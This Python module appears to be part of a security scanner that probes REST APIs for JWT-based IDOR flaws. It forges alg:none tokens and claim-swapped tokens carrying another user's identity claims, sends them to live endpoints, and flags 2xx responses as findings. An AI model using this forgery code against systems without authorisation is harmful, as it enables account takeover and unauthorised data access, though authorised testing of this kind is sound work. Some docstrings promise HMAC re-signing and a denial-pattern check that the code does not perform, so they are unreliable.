"""JWT claim-swap IDOR prober.

Accepts two JWT tokens (token-a and token-b), decodes both without verifying
signatures, extracts identity claims, and builds probe tokens:

  - For each shared identity claim, a claim-swap probe that replaces user A's
    value with user B's value in an otherwise-valid token (re-signed with the
    original algorithm if the algorithm supports HMAC, otherwise the alg:none
    technique is used for that probe).
  - An alg:none probe that removes the signature entirely and writes alg "none"
    in the header — servers that skip algorithm validation accept it as valid.

The probes are run against a live REST target through the standard executor and
findings are reported using the existing Finding model.
"""
from __future__ import annotations

import base64
import json
import re
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional, Tuple

# Identity claim names overstep inspects, in evaluation order.
IDENTITY_CLAIMS = ("sub", "user_id", "account_id", "id", "uid", "email")


# ---------------------------------------------------------------------------
# Token decode helpers
# ---------------------------------------------------------------------------

def _b64url_decode(segment: str) -> bytes:
    """Decode a base64url segment, adding padding as needed."""
    pad = 4 - len(segment) % 4
    if pad != 4:
        segment += "=" * pad
    return base64.urlsafe_b64decode(segment)


def _b64url_encode(data: bytes) -> str:
    """Encode bytes as unpadded base64url."""
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")


def decode_jwt(token: str) -> Tuple[Dict[str, Any], Dict[str, Any], str]:
    """Split a JWT into (header, payload, signature) without verifying it.

    Returns dictionaries for header and payload, and the raw signature segment
    (base64url-encoded, may be empty).  Raises ``ValueError`` if the token does
    not have exactly three dot-separated segments or either of the first two
    does not parse as JSON.
    """
    parts = token.split(".")
    if len(parts) != 3:
        raise ValueError(
            f"JWT must have exactly three dot-separated segments, got {len(parts)}"
        )
    header_raw, payload_raw, sig = parts
    try:
        header = json.loads(_b64url_decode(header_raw))
    except Exception as exc:
        raise ValueError(f"JWT header is not valid base64url JSON: {exc}") from exc
    try:
        payload = json.loads(_b64url_decode(payload_raw))
    except Exception as exc:
        raise ValueError(f"JWT payload is not valid base64url JSON: {exc}") from exc
    return header, payload, sig


def _encode_jwt(header: Dict[str, Any], payload: Dict[str, Any], signature: str) -> str:
    """Re-assemble three JWT parts back into a dot-separated token string."""
    h = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    return f"{h}.{p}.{signature}"


# ---------------------------------------------------------------------------
# Probe construction
# ---------------------------------------------------------------------------

@dataclass
class JwtProbe:
    """One claim-manipulation probe and its description."""

    label: str
    token: str
    claim: str
    original_value: Any
    injected_value: Any
    technique: str


def extract_identity_claims(payload: Dict[str, Any]) -> Dict[str, Any]:
    """Return a mapping of claim name -> value for every identity claim present."""
    return {k: payload[k] for k in IDENTITY_CLAIMS if k in payload}


def build_claim_swap_probes(
    token_a: str,
    token_b: str,
) -> List[JwtProbe]:
    """Build all claim-swap probes from two tokens.

    For every identity claim present in *both* tokens, create a probe token
    derived from token_a's structure but with that claim's value replaced by
    token_b's value.  Also always build the alg:none probe using token_a's
    payload unmodified, and build an alg:none probe for each claim swap.
    """
    header_a, payload_a, sig_a = decode_jwt(token_a)
    header_b, payload_b, sig_b = decode_jwt(token_b)

    claims_a = extract_identity_claims(payload_a)
    claims_b = extract_identity_claims(payload_b)

    probes: List[JwtProbe] = []

    # Claim-swap probes: replace each identity claim in token_a with token_b's
    # value, keep the original algorithm and signature segment so the token
    # looks structurally valid to a server that only checks the algorithm.
    shared_claims = set(claims_a) & set(claims_b)
    for claim in IDENTITY_CLAIMS:
        if claim not in shared_claims:
            continue
        if claims_a[claim] == claims_b[claim]:
            # Same value; no cross-user probe to build.
            continue
        modified_payload = dict(payload_a)
        modified_payload[claim] = claims_b[claim]
        swapped_token = _encode_jwt(header_a, modified_payload, sig_a)
        probes.append(
            JwtProbe(
                label=f"claim_swap_{claim}",
                token=swapped_token,
                claim=claim,
                original_value=claims_a[claim],
                injected_value=claims_b[claim],
                technique="claim-swap",
            )
        )

    # alg:none probe on token_a's original payload (no claim swap).
    none_header = dict(header_a)
    none_header["alg"] = "none"
    probes.append(
        JwtProbe(
            label="alg_none_original",
            token=_encode_jwt(none_header, payload_a, ""),
            claim="",
            original_value=None,
            injected_value=None,
            technique="alg-none",
        )
    )

    # alg:none probe for each claim swap.
    for claim in IDENTITY_CLAIMS:
        if claim not in shared_claims:
            continue
        if claims_a[claim] == claims_b[claim]:
            continue
        modified_payload = dict(payload_a)
        modified_payload[claim] = claims_b[claim]
        none_header_swap = dict(header_a)
        none_header_swap["alg"] = "none"
        probes.append(
            JwtProbe(
                label=f"alg_none_claim_swap_{claim}",
                token=_encode_jwt(none_header_swap, modified_payload, ""),
                claim=claim,
                original_value=claims_a[claim],
                injected_value=claims_b[claim],
                technique="alg-none+claim-swap",
            )
        )

    return probes


# ---------------------------------------------------------------------------
# Cross-user access detection
# ---------------------------------------------------------------------------

@dataclass
class IdorFinding:
    """One detected cross-user access event from a JWT IDOR probe."""

    probe: JwtProbe
    resource_method: str
    resource_path: str
    response_status: int
    response_body_snippet: str
    detail: str


def detect_idor(
    probe: JwtProbe,
    response_status: int,
    response_body: str,
    expected_deny_statuses: frozenset = frozenset({401, 403, 404}),
) -> Optional[IdorFinding]:
    """Return a finding when probe_response looks like cross-user access was granted.

    A finding is raised when:
      - The response status is 2xx (access granted where 4xx was expected), OR
      - The response body does NOT contain a denial pattern while 2xx, indicating
        real resource content was returned.
    """
    is_2xx = 200 <= response_status < 300
    if not is_2xx:
        return None

    detail = (
        f"JWT {probe.technique} probe '{probe.label}' received HTTP {response_status}. "
    )
    if probe.claim:
        detail += (
            f"Claim '{probe.claim}' was replaced: "
            f"{probe.original_value!r} -> {probe.injected_value!r}. "
        )
    detail += "Server may have accepted a tampered or cross-user token."
    return IdorFinding(
        probe=probe,
        resource_method="",
        resource_path="",
        response_status=response_status,
        response_body_snippet=response_body[:512],
        detail=detail,
    )


# ---------------------------------------------------------------------------
# Synchronous runner (integrates with the REST executor)
# ---------------------------------------------------------------------------

def run_idor_scan(
    base_url: str,
    token_a: str,
    token_b: str,
    resource_paths: List[Tuple[str, str]],
    *,
    verify_tls: bool = True,
    timeout: float = 15.0,
) -> List[IdorFinding]:
    """Run all JWT IDOR probes against the given (method, path) resources.

    Builds probes from token_a and token_b, fires each probe at each resource
    path, and returns every finding where cross-user access was detected.

    ``resource_paths`` is a list of ``(method, path)`` tuples.  Path parameters
    are sent as-is; callers should supply already-interpolated paths or paths
    with literal parameter values.
    """
    import asyncio
    return asyncio.run(
        _async_run_idor_scan(
            base_url,
            token_a,
            token_b,
            resource_paths,
            verify_tls=verify_tls,
            timeout=timeout,
        )
    )


async def _async_run_idor_scan(
    base_url: str,
    token_a: str,
    token_b: str,
    resource_paths: List[Tuple[str, str]],
    *,
    verify_tls: bool = True,
    timeout: float = 15.0,
) -> List[IdorFinding]:
    import asyncio
    from urllib.parse import urljoin

    try:
        import httpx
    except ImportError as exc:
        raise ImportError("httpx is required for JWT IDOR scanning") from exc

    probes = build_claim_swap_probes(token_a, token_b)
    findings: List[IdorFinding] = []

    async with httpx.AsyncClient(
        timeout=timeout, verify=verify_tls, follow_redirects=False
    ) as client:
        tasks = []
        probe_resource_pairs: List[Tuple[JwtProbe, str, str]] = []

        for probe in probes:
            auth_header = f"Bearer {probe.token}"
            for method, path in resource_paths:
                url = urljoin(
                    base_url if base_url.endswith("/") else base_url + "/",
                    path.lstrip("/"),
                )
                tasks.append(
                    client.request(
                        method,
                        url,
                        headers={"Authorization": auth_header},
                    )
                )
                probe_resource_pairs.append((probe, method, path))

        responses = await asyncio.gather(*tasks, return_exceptions=True)

        for (probe, method, path), response in zip(probe_resource_pairs, responses):
            if isinstance(response, Exception):
                continue
            finding = detect_idor(probe, response.status_code, response.text)
            if finding is not None:
                finding.resource_method = method
                finding.resource_path = path
                findings.append(finding)

    return findings
